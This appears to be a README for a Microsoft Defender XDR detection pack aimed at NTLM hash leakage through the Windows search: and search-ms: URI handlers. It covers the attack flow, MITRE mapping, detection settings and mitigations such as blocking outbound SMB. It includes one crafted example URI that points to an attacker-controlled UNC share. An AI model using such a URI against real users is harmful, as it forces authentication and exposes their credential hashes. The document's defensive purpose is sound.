# Unpatched-NTLM-Leakage-in-Windows-search-URI-Handler
Proactive threat hunting for relevant NTLM leakage primitive in Windows Search URI Handler 6/4/2026






Microsoft Defender XDR Detection Pack: Search URI NTLM Credential Leakage

Overview

This repository contains Microsoft Defender XDR Advanced Hunting queries and Custom Detection Rules designed to identify abuse of the Windows search: and search-ms: URI handlers for NTLM credential leakage.

The detection content was developed in response to publicly disclosed research demonstrating that Windows Search URI handlers can be abused to trigger outbound SMB authentication to attacker-controlled systems via a crafted UNC path supplied through the crumb=location: parameter.

A successful attack may expose a user's Net-NTLMv2 hash without requiring malware, privilege escalation, or file downloads.

Threat Summary

Attack Flow

	1. User clicks a malicious link containing a search: or search-ms: URI.
	2. Windows Explorer processes the URI through the SearchExecute COM handler.
	3. The URI references a remote UNC path using crumb=location:\\attacker\share.
	4. Windows automatically attempts SMB authentication.
	5. The attacker captures the victim's Net-NTLMv2 challenge-response.
Example:
search:query=test&crumb=location:\\attacker\share

---

MITRE ATT&CK Mapping

Technique	Description

T1187	Forced Authentication

T1557	Adversary-in-the-Middle

T1110.002	Password Cracking

T1021.002	SMB/Windows Admin Shares


---
Recommended Defender Configuration

Custom Detection Settings

Setting	Recommendation

1. Frequency	Every 5 minutes

2. Lookback	1-2 hours

3. Severity	High

Automated Investigation	Enabled

Incident Creation	Enabled

---
Recommended Mitigations

Block Outbound SMB

Prevent workstations from initiating outbound SMB connections:

TCP/445

TCP/139

except where explicitly required.

Enforce SMB Signing

Reduce NTLM relay attack opportunities.

Restrict NTLM Usage

Review and gradually implement:

RestrictSendingNTLMTraffic = 2

Audit mode is recommended before enforcement.

---
Detection Philosophy

This repository focuses on behavioral detection rather than CVE-driven detection.

Multiple publicly documented Windows URI handlers have exhibited similar NTLM leakage behavior. Defenders should detect the underlying technique rather than relying solely on vulnerability identifiers or vendor-serviced CVEs.

The objective is to identify:

	• Forced authentication attempts
	• Unexpected SMB authentication
	• URI-handler abuse
	• NTLM credential exposure activity
regardless of the specific Windows component involved.

---
Disclaimer

This repository is intended for defensive security, threat hunting, detection engineering, and incident response purposes only.
Always validate detections in a test environment before deploying to production.

